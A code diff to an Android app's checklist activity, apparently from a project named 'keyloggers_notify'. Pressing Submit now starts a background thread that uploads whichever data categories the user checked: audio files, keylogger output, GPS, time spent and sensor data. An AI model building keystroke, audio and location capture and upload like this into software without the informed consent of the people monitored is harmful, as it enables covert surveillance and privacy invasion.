@@ -1,5 +1,6 @@
 package com.example.halac.keyloggers_notify;
 
+import android.content.Intent;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.text.TextUtils;
@@ -9,6 +10,8 @@ import android.widget.Button;
 import android.widget.ListView;
 import android.widget.Toast;
 
+import java.io.IOException;
+import java.security.GeneralSecurityException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -38,9 +41,17 @@ public class CheckListActivity extends AppCompatActivity implements Button.OnCli
     public void onClick(View view) {
         switch (view.getId()) {
             case R.id.SubmitData:
-                List<String> selected = getSelectedItems();
-                String logString = "Selected items: " + TextUtils.join(", ", selected);
-                Toast.makeText(this, logString, Toast.LENGTH_SHORT).show();
+                final List<String> selected = getSelectedItems();
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            Uploader.upload(selected.contains("Audio Files"), selected.contains("Key Logger"), selected.contains("GPS"), selected.contains("Time Spent"), selected.contains("Sensors"));
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
                 break;
 
             case R.id.cancel:
